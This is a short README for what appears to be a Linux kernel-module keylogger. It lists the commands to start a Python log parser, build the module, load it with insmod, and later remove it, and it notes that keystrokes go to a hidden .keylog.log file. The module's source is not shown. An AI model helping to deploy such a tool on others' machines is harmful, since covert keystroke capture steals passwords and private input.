## INITIATING THE KEYLOGGER KERNEL MODULE

### Start python script that updates log file
```
python3 live_parser.py
```

### Make kernel module
```
make
```

### Insert module
```
insmod keylogger.ko
```
### Once ls is invoked. A hidden .keylog.log file will be created.  
### WARNING: Cannot remove module until live_parser.py is killed.

## REMOVING THE KEYLOGGER KERNEL MODULE
### Kill python3 pid
```
rmmod keylogger.ko 
```
### Clean directory
```
make clean
```
